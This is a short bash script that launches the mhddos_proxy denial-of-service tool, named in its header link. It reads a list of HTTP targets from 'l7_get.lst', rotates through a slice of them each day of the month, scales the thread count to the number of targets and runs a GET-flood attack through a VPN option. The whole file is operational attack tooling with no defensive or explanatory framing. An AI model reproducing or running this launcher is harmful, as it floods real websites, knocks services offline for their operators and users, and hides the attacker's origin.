#!/usr/bin/env bash

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

BASE_DIR="$(dirname -- "$(readlink -f "${BASH_SOURCE}")")"
BASE_FILE='l7_get.lst'
CURRENT_DAY=$(date +%-d)
DAYS_IN_MONTH=$(cal |egrep -v [a-z] |wc -w)
LINES=$(cat $BASE_DIR/../$BASE_FILE | wc -l)
TARGETS_FILE="$BASE_DIR/../$BASE_FILE"
((THREADS=$LINES*(2**5)))

if [ "$DAYS_IN_MONTH" -lt "$LINES" ]; then
  LINES_PER_PART=$(python3 -c "print(round(float($LINES/$DAYS_IN_MONTH)))")
else
  LINES_PER_PART=1
fi

MAX_SPLIT_N=$(python3 -c "from math import ceil; print(ceil(float($LINES/$LINES_PER_PART)))")
CURRENT_SPLIT=$(printf %02d `python3 -c "print(max(round(float($MAX_SPLIT_N*$CURRENT_DAY/$DAYS_IN_MONTH)), 1))"`)
TARGETS_FILE_SPLIT="$BASE_DIR/../$BASE_FILE.$CURRENT_SPLIT"

split --numeric-suffixes=1 -l $LINES_PER_PART $TARGETS_FILE "$TARGETS_FILE."

python3 runner.py \
  --config "$TARGETS_FILE_SPLIT" \
  --http-methods GET \
  --lang en \
  --threads "$THREADS" \
  --vpn
